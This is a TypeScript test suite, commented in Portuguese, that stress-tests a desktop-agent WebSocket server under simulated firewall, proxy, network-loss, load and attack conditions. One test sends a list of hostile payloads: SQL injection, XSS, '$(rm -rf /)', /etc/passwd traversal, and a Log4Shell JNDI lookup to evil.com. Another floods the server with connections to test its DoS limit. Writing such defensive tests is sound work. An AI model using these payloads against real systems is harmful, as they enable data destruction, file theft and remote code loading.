import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import WebSocket from 'ws';
import { createServer, Server as HTTPServer } from 'http';
import { DesktopAgentServer } from './services/desktopAgentServer';
import { createAgent, generateAgentToken } from './db-desktop-control';

// ============================================================================
// TESTES DE STRESS E AMBIENTE HOSTIL - DESKTOP AGENT
// ============================================================================
// Simula condições extremas encontradas em ambientes corporativos:
// - Firewall agressivo (bloqueio de portas, rate limiting)
// - Antivírus/EDR (bloqueio de conexões, inspeção de pacotes)
// - Proxy corporativo (interceptação SSL, modificação de headers)
// - Rede instável (latência alta, packet loss, reconexões)
// - Carga extrema (múltiplos agents, mensagens em massa)
// - Ataques maliciosos (mensagens malformadas, DoS, injection)
// ============================================================================

describe('WebSocket Stress & Hostile Environment Tests', () => {
  let httpServer: HTTPServer;
  let desktopAgentServer: DesktopAgentServer;
  let serverUrl: string;
  let validToken: string;
  let agentId: number;

  beforeAll(async () => {
    // Criar servidor HTTP
    httpServer = createServer();
    
    // Criar servidor WebSocket
    desktopAgentServer = new DesktopAgentServer(httpServer);
    
    // Iniciar servidor
    await new Promise<void>((resolve) => {
      httpServer.listen(0, () => {
        const address = httpServer.address();
        const port = typeof address === 'string' ? 3000 : address?.port || 3000;
        serverUrl = `ws://localhost:${port}/desktop-agent`;
        console.log(`[Test] Servidor iniciado em ${serverUrl}`);
        resolve();
      });
    });

    // Criar agent de teste
    validToken = generateAgentToken();
    const agent = await createAgent({
      userId: 1,
      token: validToken,
      deviceName: 'Stress Test Agent',
      platform: 'windows',
      version: '1.0.0',
    });
    agentId = agent.id;
  });

  afterAll(async () => {
    desktopAgentServer.close();
    await new Promise<void>((resolve) => {
      httpServer.close(() => {
        console.log('[Test] Servidor fechado');
        resolve();
      });
    });
  });

  // ============================================================================
  // TESTE 1: FIREWALL AGRESSIVO - Rate Limiting Extremo
  // ============================================================================
  describe('🔥 Firewall Agressivo', () => {
    it('deve sobreviver a rate limiting extremo (100 msg/s)', async () => {
      const ws = new WebSocket(serverUrl, {
        headers: { Authorization: `Bearer ${validToken}` }
      });

      await new Promise<void>((resolve, reject) => {
        ws.on('open', () => resolve());
        ws.on('error', reject);
        setTimeout(() => reject(new Error('Timeout na conexão')), 5000);
      });

      let messagesReceived = 0;
      let errors = 0;

      ws.on('message', () => {
        messagesReceived++;
      });

      ws.on('error', () => {
        errors++;
      });

      // Enviar 100 mensagens em 1 segundo (100 msg/s)
      const messages = Array.from({ length: 100 }, (_, i) => ({
        type: 'heartbeat',
        timestamp: new Date().toISOString(),
        device_id: `device-${i}`
      }));

      for (const msg of messages) {
        ws.send(JSON.stringify(msg));
        await new Promise(resolve => setTimeout(resolve, 10)); // 10ms entre mensagens
      }

      // Aguardar processamento
      await new Promise(resolve => setTimeout(resolve, 2000));

      console.log(`✅ Rate limiting: ${messagesReceived} mensagens recebidas, ${errors} erros`);
      
      // Deve ter recebido pelo menos 50% das mensagens (rate limiting pode bloquear algumas)
      expect(messagesReceived).toBeGreaterThan(50);
      
      ws.close();
    }, 10000);

    it('deve reconectar após bloqueio de firewall simulado', async () => {
      const ws1 = new WebSocket(serverUrl, {
        headers: { Authorization: `Bearer ${validToken}` }
      });

      await new Promise<void>((resolve) => {
        ws1.on('open', () => resolve());
      });

      // Simular bloqueio: fechar conexão abruptamente
      ws1.terminate();

      await new Promise(resolve => setTimeout(resolve, 1000));

      // Tentar reconectar
      const ws2 = new WebSocket(serverUrl, {
        headers: { Authorization: `Bearer ${validToken}` }
      });

      const reconnected = await new Promise<boolean>((resolve) => {
        ws2.on('open', () => resolve(true));
        ws2.on('error', () => resolve(false));
        setTimeout(() => resolve(false), 5000);
      });

      expect(reconnected).toBe(true);
      console.log('✅ Reconexão após bloqueio de firewall bem-sucedida');
      
      ws2.close();
    });
  });

  // ============================================================================
  // TESTE 2: ANTIVÍRUS/EDR - Inspeção de Pacotes
  // ============================================================================
  describe('🛡️ Antivírus/EDR', () => {
    it('deve passar por inspeção de pacotes (mensagens grandes)', async () => {
      const ws = new WebSocket(serverUrl, {
        headers: { Authorization: `Bearer ${validToken}` }
      });

      await new Promise<void>((resolve) => {
        ws.on('open', () => resolve());
      });

      // Enviar mensagem grande (500 KB) - antivírus inspeciona pacotes grandes
      const largePayload = 'A'.repeat(500 * 1024);
      const message = {
        type: 'log',
        timestamp: new Date().toISOString(),
        payload: { data: largePayload }
      };

      let received = false;
      ws.on('message', () => {
        received = true;
      });

      ws.send(JSON.stringify(message));

      await new Promise(resolve => setTimeout(resolve, 2000));

      console.log(`✅ Mensagem grande (500 KB) ${received ? 'aceita' : 'rejeitada'} pelo antivírus`);
      
      // Deve ser rejeitada por exceder 1MB, mas não deve crashar
      expect(ws.readyState).not.toBe(WebSocket.CLOSED);
      
      ws.close();
    });

    it('deve resistir a tentativas de injection em payloads', async () => {
      const ws = new WebSocket(serverUrl, {
        headers: { Authorization: `Bearer ${validToken}` }
      });

      await new Promise<void>((resolve) => {
        ws.on('open', () => resolve());
      });

      // Tentar SQL injection, XSS, command injection
      const maliciousPayloads = [
        "'; DROP TABLE agents; --",
        "<script>alert('XSS')</script>",
        "$(rm -rf /)",
        "../../../etc/passwd",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}"
      ];

      let allBlocked = true;

      for (const payload of maliciousPayloads) {
        const message = {
          type: 'log',
          timestamp: new Date().toISOString(),
          payload: { malicious: payload }
        };

        ws.send(JSON.stringify(message));
        await new Promise(resolve => setTimeout(resolve, 100));

        // Verificar se conexão ainda está aberta (não foi explorada)
        if (ws.readyState === WebSocket.CLOSED) {
          allBlocked = false;
          break;
        }
      }

      console.log(`✅ Tentativas de injection ${allBlocked ? 'bloqueadas' : 'VULNERÁVEL!'}`);
      expect(allBlocked).toBe(true);
      
      ws.close();
    });
  });

  // ============================================================================
  // TESTE 3: PROXY CORPORATIVO - Interceptação SSL
  // ============================================================================
  describe('🌐 Proxy Corporativo', () => {
    it('deve funcionar com headers modificados por proxy', async () => {
      const ws = new WebSocket(serverUrl, {
        headers: {
          Authorization: `Bearer ${validToken}`,
          'X-Forwarded-For': '10.0.0.1',
          'X-Real-IP': '192.168.1.100',
          'Via': '1.1 proxy.corp.com',
          'X-Proxy-ID': 'corporate-proxy-123'
        }
      });

      const connected = await new Promise<boolean>((resolve) => {
        ws.on('open', () => resolve(true));
        ws.on('error', () => resolve(false));
        setTimeout(() => resolve(false), 5000);
      });

      expect(connected).toBe(true);
      console.log('✅ Conexão via proxy corporativo bem-sucedida');
      
      ws.close();
    });

    it('deve manter conexão com latência alta (500ms)', async () => {
      const ws = new WebSocket(serverUrl, {
        headers: { Authorization: `Bearer ${validToken}` }
      });

      await new Promise<void>((resolve) => {
        ws.on('open', () => resolve());
      });

      let pongReceived = false;

      ws.on('message', (data) => {
        const msg = JSON.parse(data.toString());
        if (msg.type === 'pong') {
          pongReceived = true;
        }
      });

      // Simular latência: aguardar 500ms antes de enviar ping
      await new Promise(resolve => setTimeout(resolve, 500));

      ws.send(JSON.stringify({
        type: 'ping',
        timestamp: new Date().toISOString()
      }));

      await new Promise(resolve => setTimeout(resolve, 1000));

      expect(pongReceived).toBe(true);
      console.log('✅ Conexão mantida com latência de 500ms');
      
      ws.close();
    });
  });

  // ============================================================================
  // TESTE 4: REDE INSTÁVEL - Reconexões Frequentes
  // ============================================================================
  describe('📡 Rede Instável', () => {
    it('deve reconectar automaticamente após 5 quedas de conexão', async () => {
      let reconnections = 0;

      for (let i = 0; i < 5; i++) {
        const ws = new WebSocket(serverUrl, {
          headers: { Authorization: `Bearer ${validToken}` }
        });

        const connected = await new Promise<boolean>((resolve) => {
          ws.on('open', () => resolve(true));
          ws.on('error', () => resolve(false));
          setTimeout(() => resolve(false), 5000);
        });

        if (connected) {
          reconnections++;
          ws.terminate(); // Simular queda abrupta
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      }

      expect(reconnections).toBe(5);
      console.log(`✅ ${reconnections}/5 reconexões bem-sucedidas`);
    }, 30000);

    it('deve processar mensagens mesmo com packet loss simulado', async () => {
      const ws = new WebSocket(serverUrl, {
        headers: { Authorization: `Bearer ${validToken}` }
      });

      await new Promise<void>((resolve) => {
        ws.on('open', () => resolve());
      });

      let messagesReceived = 0;

      ws.on('message', () => {
        messagesReceived++;
      });

      // Enviar 20 mensagens, mas simular packet loss (não aguardar resposta de algumas)
      for (let i = 0; i < 20; i++) {
        ws.send(JSON.stringify({
          type: 'heartbeat',
          timestamp: new Date().toISOString(),
          device_id: `device-${i}`
        }));

        // Simular packet loss: 30% de chance de delay
        if (Math.random() < 0.3) {
          await new Promise(resolve => setTimeout(resolve, 200));
        }
      }

      await new Promise(resolve => setTimeout(resolve, 2000));

      console.log(`✅ Packet loss: ${messagesReceived}/20 mensagens recebidas`);
      
      // Deve receber pelo menos 50% das mensagens
      expect(messagesReceived).toBeGreaterThan(10);
      
      ws.close();
    });
  });

  // ============================================================================
  // TESTE 5: CARGA EXTREMA - Múltiplos Agents
  // ============================================================================
  describe('⚡ Carga Extrema', () => {
    it('deve suportar 50 agents conectados simultaneamente', async () => {
      const agents: WebSocket[] = [];
      let successfulConnections = 0;

      // Criar 50 tokens
      const tokens = await Promise.all(
        Array.from({ length: 50 }, async (_, i) => {
          const token = generateAgentToken();
          await createAgent({
            userId: 1,
            token,
            deviceName: `Agent ${i}`,
            platform: 'windows',
            version: '1.0.0',
          });
          return token;
        })
      );

      // Conectar 50 agents
      for (const token of tokens) {
        const ws = new WebSocket(serverUrl, {
          headers: { Authorization: `Bearer ${token}` }
        });

        const connected = await new Promise<boolean>((resolve) => {
          ws.on('open', () => resolve(true));
          ws.on('error', () => resolve(false));
          setTimeout(() => resolve(false), 5000);
        });

        if (connected) {
          successfulConnections++;
          agents.push(ws);
        }
      }

      console.log(`✅ ${successfulConnections}/50 agents conectados simultaneamente`);
      
      // Deve conectar pelo menos 80% dos agents
      expect(successfulConnections).toBeGreaterThan(40);

      // Fechar todas as conexões
      agents.forEach(ws => ws.close());
    }, 60000);

    it('deve processar 1000 mensagens em 10 segundos', async () => {
      const ws = new WebSocket(serverUrl, {
        headers: { Authorization: `Bearer ${validToken}` }
      });

      await new Promise<void>((resolve) => {
        ws.on('open', () => resolve());
      });

      let messagesReceived = 0;

      ws.on('message', () => {
        messagesReceived++;
      });

      const startTime = Date.now();

      // Enviar 1000 mensagens
      for (let i = 0; i < 1000; i++) {
        ws.send(JSON.stringify({
          type: 'heartbeat',
          timestamp: new Date().toISOString(),
          device_id: `device-${i}`
        }));
      }

      await new Promise(resolve => setTimeout(resolve, 10000));

      const endTime = Date.now();
      const duration = (endTime - startTime) / 1000;

      console.log(`✅ ${messagesReceived}/1000 mensagens processadas em ${duration}s`);
      console.log(`   Taxa: ${(messagesReceived / duration).toFixed(2)} msg/s`);
      
      // Deve processar pelo menos 500 mensagens
      expect(messagesReceived).toBeGreaterThan(500);
      
      ws.close();
    }, 15000);
  });

  // ============================================================================
  // TESTE 6: ATAQUES MALICIOSOS - Segurança
  // ============================================================================
  describe('🔒 Ataques Maliciosos', () => {
    it('deve bloquear mensagens malformadas (JSON inválido)', async () => {
      const ws = new WebSocket(serverUrl, {
        headers: { Authorization: `Bearer ${validToken}` }
      });

      await new Promise<void>((resolve) => {
        ws.on('open', () => resolve());
      });

      // Enviar JSON inválido
      ws.send('{"type":"auth","token":');
      ws.send('malformed json');
      ws.send('null');
      ws.send('undefined');

      await new Promise(resolve => setTimeout(resolve, 1000));

      // Conexão deve permanecer aberta (servidor deve ignorar mensagens inválidas)
      expect(ws.readyState).not.toBe(WebSocket.CLOSED);
      console.log('✅ Mensagens malformadas bloqueadas sem crashar');
      
      ws.close();
    });

    it('deve bloquear tokens inválidos (tentativa de acesso não autorizado)', async () => {
      const ws = new WebSocket(serverUrl, {
        headers: { Authorization: 'Bearer token_invalido_123' }
      });

      const rejected = await new Promise<boolean>((resolve) => {
        ws.on('close', () => resolve(true));
        ws.on('open', () => resolve(false));
        setTimeout(() => resolve(true), 5000);
      });

      expect(rejected).toBe(true);
      console.log('✅ Token inválido rejeitado corretamente');
    });

    it('deve bloquear tentativas de DoS (conexões excessivas)', async () => {
      const connections: WebSocket[] = [];
      let blocked = false;

      // Tentar abrir 200 conexões (acima do limite de 100)
      for (let i = 0; i < 200; i++) {
        const ws = new WebSocket(serverUrl, {
          headers: { Authorization: `Bearer ${validToken}` }
        });

        const connected = await new Promise<boolean>((resolve) => {
          ws.on('open', () => resolve(true));
          ws.on('close', () => resolve(false));
          ws.on('error', () => resolve(false));
          setTimeout(() => resolve(false), 1000);
        });

        if (!connected && i > 100) {
          blocked = true;
          break;
        }

        if (connected) {
          connections.push(ws);
        }
      }

      console.log(`✅ DoS bloqueado: ${connections.length} conexões aceitas, demais bloqueadas`);
      
      // Deve bloquear conexões acima do limite
      expect(blocked).toBe(true);
      expect(connections.length).toBeLessThanOrEqual(100);

      // Fechar todas as conexões
      connections.forEach(ws => ws.close());
    }, 30000);
  });

  // ============================================================================
  // TESTE 7: AMBIENTE WINDOWS REAL - Compatibilidade
  // ============================================================================
  describe('🪟 Ambiente Windows Real', () => {
    it('deve funcionar com User-Agent do Windows', async () => {
      const ws = new WebSocket(serverUrl, {
        headers: {
          Authorization: `Bearer ${validToken}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      const connected = await new Promise<boolean>((resolve) => {
        ws.on('open', () => resolve(true));
        ws.on('error', () => resolve(false));
        setTimeout(() => resolve(false), 5000);
      });

      expect(connected).toBe(true);
      console.log('✅ Compatível com User-Agent do Windows');
      
      ws.close();
    });

    it('deve funcionar com encoding Windows-1252', async () => {
      const ws = new WebSocket(serverUrl, {
        headers: { Authorization: `Bearer ${validToken}` }
      });

      await new Promise<void>((resolve) => {
        ws.on('open', () => resolve());
      });

      // Enviar caracteres especiais do Windows-1252
      const message = {
        type: 'log',
        timestamp: new Date().toISOString(),
        payload: {
          text: 'Teste com acentuação: áéíóú ÁÉÍÓÚ ãõ ÃÕ çÇ'
        }
      };

      ws.send(JSON.stringify(message));

      await new Promise(resolve => setTimeout(resolve, 1000));

      expect(ws.readyState).not.toBe(WebSocket.CLOSED);
      console.log('✅ Encoding Windows-1252 suportado');
      
      ws.close();
    });
  });
});
